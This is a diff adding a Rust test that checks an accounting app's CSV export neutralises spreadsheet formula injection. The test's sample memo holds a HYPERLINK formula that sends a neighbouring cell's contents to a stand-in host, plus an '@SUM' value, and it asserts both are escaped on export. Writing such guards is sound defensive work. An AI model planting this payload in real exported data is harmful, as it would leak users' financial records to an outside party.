@@ -277,6 +277,46 @@ fn export_round_trips_posted_lines_and_marks_voided() {
 }
 
 #[test]
+fn export_guards_cells_that_spreadsheets_would_run_as_formulas() {
+    let (_dir, vault) = setup();
+    let conn = vault.connection().expect("conn");
+    let (entity_id, acc) = entity_with_accounts(conn);
+
+    // A payer controls the memo that a bank CSV import copies into the
+    // description; it must not become a live formula in the accountant's
+    // spreadsheet.
+    let hostile = PostSimpleEntry {
+        entity_id,
+        kind: SimpleEntryKind::Expense,
+        bill_status: None,
+        entry_date: "2026-03-15".into(),
+        description: "=HYPERLINK(\"https://x.example/?\"&B2;\"open\")".into(),
+        reference: Some("@SUM(A1:A9)".into()),
+        amount_minor: 2_500,
+        category_account_id: Some(acc.food),
+        wallet_account_id: Some(acc.checking),
+        payable_account_id: None,
+        from_account_id: None,
+        to_account_id: None,
+    };
+    post_simple_entry(conn, &hostile).expect("post");
+
+    let csv = export_journal_csv(conn, entity_id).expect("export");
+    let rows: Vec<&str> = csv.lines().skip(1).collect();
+    assert_eq!(rows.len(), 2, "one debit and one credit line: {csv}");
+    for row in &rows {
+        assert!(row.starts_with("2026-03-15,\"'=HYPERLINK("), "{row}");
+        assert!(row.contains(",'@SUM(A1:A9),"), "{row}");
+    }
+
+    let parsed = parse_journal_export(&csv).expect("parse");
+    for line in &parsed {
+        assert_eq!(line.description, hostile.description);
+        assert_eq!(line.reference.as_deref(), Some("@SUM(A1:A9)"));
+    }
+}
+
+#[test]
 fn export_omits_hidden_rows_until_unhidden() {
     let (_dir, vault) = setup();
     let conn = vault.connection().expect("conn");
